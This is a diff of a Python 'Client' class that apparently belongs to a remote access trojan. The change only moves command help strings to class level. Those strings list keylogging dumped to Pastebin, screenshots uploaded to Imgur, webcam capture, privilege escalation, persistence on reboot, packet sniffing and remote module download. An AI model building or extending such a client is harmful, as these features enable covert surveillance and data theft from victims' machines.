@@ -97,31 +97,6 @@ class Client(object):
         self._modules                   = {mod: getattr(self, mod) for mod in __modules__}
         self._commands                  = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result                    = self._get_result()
-        self.ls.func_doc                = "usage:         ls <path>\ndescription:   list directory contents"
-        self.cd.func_doc                = "usage:         cd <path>\ndescription:   change directory"
-        self.set.func_doc               = "usage:         set <module> [option]=[value]\ndescription:   set module option"
-        self.new.func_doc               = "usage:         new <url>\ndescription:   download new module from url"
-        self.run.func_doc               = "usage:         run\ndescription:   run enabled client modules"
-        self.pwd.func_doc               = "usage:         pwd \ndescription:   present working directory"
-        self.jobs.func_doc              = "usage:         jobs\ndescription:   list currently active jobs"
-        self.kill.func_doc              = "usage:         kill\ndescription:   kill client"
-        self.show.func_doc              = "usage:         show <option>\ndescription:   show client attributes"
-        self.admin.func_doc             = "usage:         admin\ndescription:   attempt to escalate privileges"
-        self.shell.func_doc             = "usage:         shell\ndescription:   run client shell "
-        self.start.func_doc             = "usage:         start\ndescription:   start client"
-        self.wget.func_doc              = "usage:         wget <url>\ndescription:   download file from url"
-        self.webcam.func_doc            = "usage:         webcam\ndescription:   remote image/video capture from client webcam"
-        self.enable.func_doc            = "usage:         enable <module>\ndescription:   enable module"
-        self.standby.func_doc           = "usage:         standby\ndescription:    revert to standby mode"
-        self.options.func_doc           = "usage:         options\ndescription:   display module options"
-        self.disable.func_doc           = "usage:         disable <module>\ndescription:   disable module"
-        self.results.func_doc           = "usage:         results\ndescription:   show all modules output"
-        self.commands.func_doc          = "usage:         commands\ndescription:   list commands with descriptions"
-        self.keylogger.func_doc         = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump to Pastebin"
-        self.screenshot.func_doc        = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
-        self.persistence.func_doc       = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
-        self.packetsniffer.func_doc     = "usage:         packetsniffer\ninfo:\tcapture client network traffic + dump to Pastebin"
-
 
     # ------------------- private functions -------------------------
 
@@ -1059,6 +1034,32 @@ class Client(object):
     
     @_module
     def packetsniffer(self): return self._packetsniffer()
+
+    ls.func_doc                = """usage:\t\tls <path>\ndescription:\tlist directory contents"""
+    cd.func_doc                = """usage:\t\tcd <path>\ndescription:\tchange directory"""
+    set.func_doc               = """usage:\t\tset <module>\ndescription:\tset module option [option]=[value]"""
+    new.func_doc               = """usage:\t\tnew <url>\ndescription:\tdownload new module from url"""
+    run.func_doc               = """usage:\t\trun\ndescription:\trun enabled client modules"""
+    pwd.func_doc               = """usage:\t\tpwd\ndescription:\tpresent working directory"""
+    jobs.func_doc              = """usage:\t\tjobs\ndescription:\tlist currently active jobs"""
+    kill.func_doc              = """usage:\t\tkill\ndescription:\tkill client"""
+    show.func_doc              = """usage:\t\tshow <option>\ndescription:\tshow client attributes"""
+    admin.func_doc             = """usage:\t\tadmin\ndescription:\tattempt to escalate privileges"""
+    shell.func_doc             = """usage:\t\tshell\ndescription:\trun client shell """
+    start.func_doc             = """usage:\t\tstart\ndescription:\tstart client"""
+    wget.func_doc              = """usage:\t\twget <url>\ndescription:\tdownload file from url"""
+    webcam.func_doc            = """usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam"""
+    enable.func_doc            = """usage:\t\tenable <module>\ndescription:\tenable module"""
+    standby.func_doc           = """usage:\t\tstandby\ndescription:\trevert to standby mode"""
+    options.func_doc           = """usage:\t\toptions\ndescription:\tdisplay module options"""
+    disable.func_doc           = """usage:\t\tdisable <module>\ndescription:\tdisable module"""
+    results.func_doc           = """usage:\t\tresults\ndescription:\tshow all modules output"""
+    commands.func_doc          = """usage:\t\tcommands\ndescription:\tlist commands with descriptions"""
+    keylogger.func_doc         = """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely + dump to Pastebin"""
+    screenshot.func_doc        = """usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to Imgur"""
+    persistence.func_doc       = """usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot"""
+    packetsniffer.func_doc     = """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic + dump to Pastebin"""
+
 
 
 # -----------------   main   --------------------------
